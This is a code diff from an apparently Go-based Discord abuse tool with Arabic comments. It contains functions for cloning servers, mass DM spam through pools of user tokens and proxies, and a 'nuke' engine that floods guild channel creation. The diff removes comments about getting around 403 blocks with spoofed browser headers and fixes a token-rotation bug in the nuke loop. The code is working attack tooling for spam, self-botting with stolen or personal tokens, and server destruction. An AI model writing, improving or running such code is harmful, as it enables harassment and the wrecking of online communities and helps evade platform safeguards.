@@ -623,7 +623,6 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 	updateInteractionStatus(s, interaction, "✅ تم استنساخ الرتب والرومات والفئات بكامل الصلاحيات والألوان والترتيب بنجاح تام! 🚀")
 }
 
-// دالة محرك إرسال الرسائل الخاصة (MassDM) المصححة بالكامل لتجاوز خطأ 403
 func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, userToken string, messageContent string, interaction *discordgo.Interaction, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال التوكنات الشخصية للإرسال.")
@@ -654,7 +653,6 @@ func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, u
 			return
 		}
 
-		// التعديل الهام هنا: ضمان إرسال التوكن الشخصي الصحيح حصراً لسحب الأعضاء مع Headers متصفح حقيقية
 		req.Header.Set("Authorization", userToken)
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "application/json")
@@ -948,7 +946,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 		go func(wID int) {
 			defer wgCreate.Done()
 			client := clients[wID%len(clients)]
-			token := tokens[index%len(tokens)]
+			token := tokens[wID%len(tokens)] // تم تصحيح الخطأ هنا واستبدال index بـ wID
 
 			for p := range roomChan {
 				req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
